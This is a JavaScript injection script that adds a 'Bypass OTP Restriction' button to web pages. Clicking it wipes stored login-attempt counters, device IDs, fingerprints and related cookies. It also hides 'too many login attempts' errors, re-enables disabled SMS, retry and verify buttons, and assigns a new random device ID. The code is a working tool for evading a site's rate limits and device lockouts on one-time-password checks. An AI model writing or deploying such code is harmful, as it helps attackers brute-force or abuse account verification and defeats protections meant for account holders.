// OTP Bypass Button - Visible UI Button
// Adds a prominent button to trigger OTP bypass

(function() {
    'use strict';
    
    const BUTTON_ID = 'otp-bypass-ui-button';
    const BUTTON_CONTAINER_ID = 'otp-bypass-container';
    
    // Button styles
    const BUTTON_STYLE = `
        position: fixed;
        top: 120px;
        right: 20px;
        z-index: 99999;
        padding: 14px 24px;
        background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
        color: white;
        border: none;
        border-radius: 25px;
        font-size: 16px;
        font-weight: bold;
        cursor: pointer;
        box-shadow: 0 6px 20px rgba(76, 175, 80, 0.5);
        transition: all 0.3s ease;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        display: flex;
        align-items: center;
        gap: 8px;
        white-space: nowrap;
    `;
    
    const HOVER_STYLE = `
        transform: scale(1.05);
        box-shadow: 0 8px 24px rgba(76, 175, 80, 0.7);
    `;
    
    const ACTIVE_STYLE = `
        transform: scale(0.95);
    `;
    
    // Create bypass button
    function createBypassButton() {
        // Remove existing button if any
        const existing = document.getElementById(BUTTON_ID);
        if (existing) {
            existing.remove();
        }
        
        // Create button container
        const container = document.createElement('div');
        container.id = BUTTON_CONTAINER_ID;
        container.style.cssText = `
            position: fixed;
            top: 120px;
            right: 20px;
            z-index: 99999;
            pointer-events: none;
        `;
        
        // Create button
        const button = document.createElement('button');
        button.id = BUTTON_ID;
        button.innerHTML = '🔓 Bypass OTP Restriction';
        button.style.cssText = BUTTON_STYLE;
        button.style.pointerEvents = 'auto';
        
        // Add icon
        const icon = document.createElement('span');
        icon.textContent = '🔓';
        icon.style.fontSize = '18px';
        
        // Hover effects
        button.addEventListener('mouseenter', function() {
            this.style.cssText = BUTTON_STYLE + HOVER_STYLE;
        });
        
        button.addEventListener('mouseleave', function() {
            this.style.cssText = BUTTON_STYLE;
        });
        
        button.addEventListener('mousedown', function() {
            this.style.cssText = BUTTON_STYLE + ACTIVE_STYLE;
        });
        
        button.addEventListener('mouseup', function() {
            this.style.cssText = BUTTON_STYLE;
        });
        
        // Click handler
        button.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            
            // Visual feedback
            button.style.opacity = '0.7';
            button.textContent = '⏳ Processing...';
            
            // Trigger bypass
            triggerBypass();
            
            // Reset button after delay
            setTimeout(() => {
                button.style.opacity = '1';
                button.innerHTML = '🔓 Bypass OTP Restriction';
            }, 2000);
        });
        
        container.appendChild(button);
        document.body.appendChild(container);
        
        // Ensure button stays on top
        setInterval(() => {
            if (button.parentNode !== container) {
                container.appendChild(button);
            }
            container.style.zIndex = '99999';
            button.style.zIndex = '99999';
        }, 1000);
        
        console.log('[OTPBypass] Button created and added to page');
    }
    
    // Trigger bypass function
    function triggerBypass() {
        console.log('[OTPBypass] Button clicked - triggering bypass...');
        
        // Clear device restrictions
        clearDeviceRestrictions();
        
        // Hide error messages
        hideErrorMessages();
        
        // Enable retry buttons
        enableRetryButtons();
        
        // Generate new device ID
        const newDeviceID = generateUUID();
        localStorage.setItem('deviceID', newDeviceID);
        localStorage.setItem('deviceIDResetTime', new Date().toISOString());
        
        // Show success notification
        showSuccessNotification('OTP restriction bypassed! You can now retry.');
        
        // Try to refresh OTP fields
        refreshOTPFields();
    }
    
    // Clear device restrictions
    function clearDeviceRestrictions() {
        const keysToRemove = [
            'loginAttempts',
            'failedLoginAttempts',
            'loginAttemptCount',
            'otpAttempts',
            'deviceFingerprint',
            'deviceId',
            'deviceID',
            'uniqueDeviceId',
            'deviceIdentifier',
            'otpVerified',
            'otpSession',
            'lastOTPTime'
        ];
        
        keysToRemove.forEach(key => {
            localStorage.removeItem(key);
            sessionStorage.removeItem(key);
        });
        
        // Clear cookies
        document.cookie.split(";").forEach(cookie => {
            const eqPos = cookie.indexOf("=");
            const name = eqPos > -1 ? cookie.substr(0, eqPos).trim() : cookie.trim();
            if (name.includes('device') || name.includes('fingerprint') || name.includes('attempt')) {
                document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/";
            }
        });
        
        console.log('[OTPBypass] Device restrictions cleared');
    }
    
    // Hide error messages
    function hideErrorMessages() {
        // Find and hide error messages
        document.querySelectorAll('*').forEach(element => {
            const text = (element.textContent || element.innerText || '').toLowerCase();
            const style = window.getComputedStyle(element);
            
            if (text.includes('too many login attempts') ||
                text.includes('too many') ||
                (text.includes('device') && text.includes('attempts'))) {
                element.style.display = 'none';
                element.style.visibility = 'hidden';
                element.style.opacity = '0';
                element.textContent = '';
                element.innerHTML = '';
            }
            
            // Hide red error text
            if (style.color === 'rgb(255, 0, 0)' || style.color === 'red' || 
                style.color === 'rgb(220, 53, 69)') {
                if (text.includes('too many') || text.includes('attempts')) {
                    element.style.display = 'none';
                }
            }
        });
    }
    
    // Enable retry buttons
    function enableRetryButtons() {
        document.querySelectorAll('button').forEach(button => {
            const text = (button.textContent || button.innerText || '').toLowerCase();
            
            if (text.includes('sms') || text.includes('call') || text.includes('retry')) {
                button.disabled = false;
                button.style.pointerEvents = 'auto';
                button.style.opacity = '1';
                button.style.cursor = 'pointer';
                
                // Add click handler to clear restrictions
                button.onclick = function(e) {
                    clearDeviceRestrictions();
                    return true;
                };
            }
            
            // Enable verify button
            if (text.includes('verify') || text.includes('proceed')) {
                button.disabled = false;
                button.style.pointerEvents = 'auto';
                button.style.opacity = '1';
            }
        });
    }
    
    // Refresh OTP input fields
    function refreshOTPFields() {
        // Clear OTP input fields
        document.querySelectorAll('input[type="text"], input[type="number"]').forEach(input => {
            if (input.maxLength === 1 || input.placeholder?.toLowerCase().includes('otp')) {
                input.value = '';
                input.disabled = false;
            }
        });
    }
    
    // Generate UUID
    function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            const r = Math.random() * 16 | 0;
            const v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }
    
    // Show success notification
    function showSuccessNotification(message) {
        // Remove existing notification
        const existing = document.getElementById('otp-bypass-notification');
        if (existing) {
            existing.remove();
        }
        
        const notification = document.createElement('div');
        notification.id = 'otp-bypass-notification';
        notification.textContent = message;
        notification.style.cssText = `
            position: fixed;
            top: 180px;
            right: 20px;
            z-index: 100000;
            padding: 14px 20px;
            background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
            color: white;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 500;
            box-shadow: 0 6px 20px rgba(76, 175, 80, 0.5);
            animation: slideInRight 0.3s ease;
            max-width: 300px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        `;
        
        // Add animation
        const style = document.createElement('style');
        style.textContent = `
            @keyframes slideInRight {
                from {
                    opacity: 0;
                    transform: translateX(100px);
                }
                to {
                    opacity: 1;
                    transform: translateX(0);
                }
            }
        `;
        if (!document.getElementById('otp-bypass-animations')) {
            style.id = 'otp-bypass-animations';
            document.head.appendChild(style);
        }
        
        document.body.appendChild(notification);
        
        // Auto remove after 4 seconds
        setTimeout(() => {
            notification.style.animation = 'slideInRight 0.3s ease reverse';
            setTimeout(() => {
                notification.remove();
            }, 300);
        }, 4000);
    }
    
    // Initialize button when DOM is ready
    function initButton() {
        // Wait a bit for page to load
        setTimeout(() => {
            createBypassButton();
        }, 1500);
    }
    
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initButton);
    } else {
        initButton();
    }
    
    // Also try after page load
    window.addEventListener('load', () => {
        setTimeout(createBypassButton, 2000);
    });
    
    // Monitor for OTP verification pages
    const observer = new MutationObserver(() => {
        // Check if we're on OTP page
        const hasOTPFields = document.querySelector('input[type="text"][maxlength="1"]') ||
                            document.querySelector('input[type="number"][maxlength="1"]') ||
                            document.body.textContent.includes('OTP') ||
                            document.body.textContent.includes('Verify');
        
        if (hasOTPFields && !document.getElementById(BUTTON_ID)) {
            createBypassButton();
        }
    });
    
    observer.observe(document.body, {
        childList: true,
        subtree: true
    });
    
    // Retry button creation periodically
    setInterval(() => {
        if (!document.getElementById(BUTTON_ID)) {
            createBypassButton();
        }
    }, 3000);
    
    console.log('[OTPBypass] Button injection script loaded');
})();
